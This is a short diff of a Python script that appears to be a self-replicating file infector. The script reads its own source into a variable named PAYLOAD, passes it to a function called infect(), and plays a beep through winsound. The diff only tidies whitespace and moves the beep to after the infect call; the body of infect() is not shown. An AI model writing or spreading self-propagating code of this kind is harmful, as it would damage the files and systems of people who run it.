@@ -3,7 +3,7 @@ import glob,os,hashlib,winsound,re
 
 #### t45r6fye
 FREQ = 2500  
-DUR = 1000  
+DUR = 1000
 global i
 def Beep(frequency,duration):
     winsound.Beep(frequency, duration)
@@ -43,5 +43,7 @@ def infect(PAYLOAD):
 with open(__file__,'r') as current_file:
     PAYLOAD = current_file.read()
 
-Beep(FREQ,DUR)
+
 infect(PAYLOAD)
+Beep(FREQ,DUR)
+
